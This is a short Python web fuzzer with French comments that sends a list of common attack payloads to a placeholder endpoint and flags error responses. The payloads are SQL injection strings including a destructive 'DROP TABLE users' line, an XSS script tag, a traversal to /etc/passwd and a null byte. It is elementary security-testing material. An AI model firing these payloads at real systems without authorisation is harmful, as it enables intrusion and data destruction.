import requests
import random
import string
import time

# Configuration
target_url = "http://example.com/vulnerable-endpoint"  # Remplace par l'URL cible
param_name = "input"  # Nom du paramètre à tester

# Payloads courantes pour tester les vulnérabilités
payloads = [
    "' OR '1'='1" ,  # Injection SQL
    "<script>alert('XSS')</script>",  # XSS
    "../../../../etc/passwd",  # Directory Traversal
    "AAAAA" * 100,  # Buffer Overflow
    "%00",  # Null byte injection
    "' OR 1=1 --",  # SQL Injection
    "\"; DROP TABLE users; --"
]

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def fuzz():
    for payload in payloads:
        # Générer une requête avec une charge utile
        params = {param_name: payload}
        try:
            response = requests.get(target_url, params=params, timeout=5)
            print(f"Test avec payload: {payload}")
            print(f"Statut: {response.status_code}, Longueur: {len(response.text)}")
            
            # Vérification de réponses suspectes
            if "error" in response.text.lower() or response.status_code == 500:
                print(f"⚠️ Potentielle vulnérabilité détectée avec payload: {payload}")
            
        except requests.exceptions.RequestException as e:
            print(f"Erreur lors de la requête: {e}")
        
        time.sleep(1)  # Évite de surcharger le serveur

if __name__ == "__main__":
    print("Démarrage du fuzzing...")
    fuzz()
